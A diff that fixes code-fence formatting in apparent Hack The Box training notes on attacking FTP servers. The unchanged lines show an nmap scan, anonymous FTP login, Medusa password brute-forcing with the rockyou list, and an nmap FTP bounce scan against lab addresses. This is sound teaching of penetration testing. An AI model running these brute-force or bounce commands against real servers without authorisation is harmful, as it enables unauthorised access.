@@ -14,8 +14,7 @@ To attack an FTP Server, we can abuse misconfiguration or excessive privileges, 
 
 #### Nmap
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
@@ -44,8 +43,7 @@ This would enable us to download this sensitive information or even upload dange
 
 #### Anonymous Authentication
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ftp 192.168.2.142    
                      
 Connected to 192.168.2.142.
@@ -81,8 +79,7 @@ If there is no anonymous authentication available, we can also brute-force the l
 
 #### Brute Forcing with Medusa
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                              
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
@@ -103,8 +100,7 @@ Source: <https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/>
 
 The `Nmap` -b flag can be used to perform an FTP bounce attack:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
